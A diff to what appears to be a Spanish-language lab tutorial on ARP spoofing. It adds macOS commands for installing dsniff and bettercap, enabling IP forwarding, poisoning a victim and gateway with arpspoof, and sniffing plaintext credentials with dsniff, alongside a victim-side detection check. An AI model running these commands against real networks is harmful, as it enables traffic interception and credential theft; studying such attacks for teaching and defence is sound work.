@@ -49,22 +49,37 @@ sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10// -w captura.pcap
 ## Ataque con arpspoof
 
 ```bash
+# Instalar (Linux)
 sudo apt-get install dsniff
 
-# Habilitar IP forwarding
+# Instalar (macOS)
+brew install dsniff
+
+# Habilitar IP forwarding (Linux)
 echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
 
-# Envenenar víctima (hacerle creer que somos el gateway)
+# Habilitar IP forwarding (macOS)
+sudo sysctl -w net.inet.ip.forwarding=1
+
+# Envenenar víctima (Linux - eth0)
 sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
 
+# Envenenar víctima (macOS - en0)
+sudo arpspoof -i en0 -t 192.168.1.10 192.168.1.1
+
 # En otra terminal, envenenar gateway
-sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
+sudo arpspoof -i en0 -t 192.168.1.1 192.168.1.10
 ```
 
 ## Ataque con Bettercap
 
 ```bash
-sudo bettercap -iface eth0
+# Instalar (macOS)
+brew install bettercap
+
+# Ejecutar (Linux: eth0, macOS: en0)
+sudo bettercap -iface eth0      # Linux
+sudo bettercap -iface en0       # macOS
 
 # Dentro de bettercap
 net.probe on
@@ -93,6 +108,14 @@ ip neigh show
 traceroute -n 8.8.8.8
 ```
 
+### Desde la víctima (macOS)
+```bash
+arp -a | grep 192.168.1.1
+# La MAC del gateway es la del atacante
+
+traceroute -n 8.8.8.8
+```
+
 ### Desde Wireshark
 ```
 Filtro: arp
@@ -109,8 +132,9 @@ Buscar:
 # Ettercap captura automáticamente
 # Ver en la consola: usuarios/contraseñas en texto plano
 
-# O usar dsniff
-sudo dsniff -i eth0
+# O usar dsniff (Linux: eth0, macOS: en0)
+sudo dsniff -i eth0             # Linux
+sudo dsniff -i en0              # macOS
 ```
 
 ### Protocolos vulnerables
